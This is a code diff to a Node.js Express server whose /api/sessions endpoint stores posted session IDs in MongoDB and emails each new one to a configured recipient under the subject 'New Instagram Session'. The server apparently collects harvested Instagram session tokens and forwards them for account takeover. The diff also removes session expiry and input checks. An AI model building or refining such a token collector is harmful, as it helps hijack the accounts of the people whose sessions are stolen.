@@ -8,96 +8,60 @@ const cors = require('cors');
 
 const app = express();
 
-// Middleware to enforce JSON responses
+// Middleware
 app.use(cors());
 app.use(express.json());
-app.use((req, res, next) => {
-  // Reject non-JSON requests
-  if (req.headers['content-type'] !== 'application/json') {
-    return res.status(415).json({ 
-      success: false,
-      error: 'Content-Type must be application/json' 
-    });
-  }
-  next();
-});
 
 // MongoDB Connection
 mongoose.connect(process.env.MONGODB_URI, {
   useNewUrlParser: true,
   useUnifiedTopology: true
-}).catch(err => console.error('MongoDB connection error:', err));
+});
 
 // Session Model
 const sessionSchema = new mongoose.Schema({
   sessionId: { type: String, unique: true },
-  createdAt: { type: Date, expires: '1h', default: Date.now }
+  createdAt: { type: Date, default: Date.now }
 });
 const Session = mongoose.model('Session', sessionSchema);
+
+// Email Transport
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS
+  }
+});
 
 // API Endpoint
 app.post('/api/sessions', async (req, res) => {
   try {
-    // Validate request
-    if (!req.body.sessionId) {
-      return res.status(400).json({
-        success: false,
-        error: 'sessionId is required'
-      });
+    const { sessionId } = req.body;
+
+    if (!sessionId) {
+      return res.status(400).json({ error: 'Session ID required' });
     }
 
-    // Check for existing session (atomic operation)
-    const result = await Session.findOneAndUpdate(
-      { sessionId: req.body.sessionId },
-      { $setOnInsert: { sessionId: req.body.sessionId } },
-      { upsert: true, new: false }
-    );
+    // Try to create new session (will fail if duplicate)
+    const newSession = await Session.create({ sessionId });
 
-    // If session already existed
-    if (result) {
-      return res.json({
-        success: true,
-        isNew: false,
-        message: 'Session already exists'
-      });
-    }
-
-    // Send email for new sessions
-    const transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-      }
-    });
-
+    // If we get here, it's a new session
     await transporter.sendMail({
       to: process.env.RECIPIENT_EMAIL,
       subject: 'New Instagram Session',
-      text: `Session ID: ${req.body.sessionId}`
+      text: `New session ID: ${sessionId}`
     });
 
-    res.json({
-      success: true,
-      isNew: true,
-      message: 'New session recorded'
-    });
+    res.json({ success: true, message: 'New session recorded' });
 
   } catch (error) {
-    console.error('Server error:', error);
-    res.status(500).json({
-      success: false,
-      error: 'Internal server error'
-    });
+    if (error.code === 11000) { // MongoDB duplicate key error
+      return res.json({ success: false, message: 'Duplicate session' });
+    }
+    console.error('Error:', error);
+    res.status(500).json({ error: 'Server error' });
   }
-});
-
-// Handle 404
-app.use((req, res) => {
-  res.status(404).json({
-    success: false,
-    error: 'Endpoint not found'
-  });
 });
 
 const PORT = process.env.PORT || 3000;
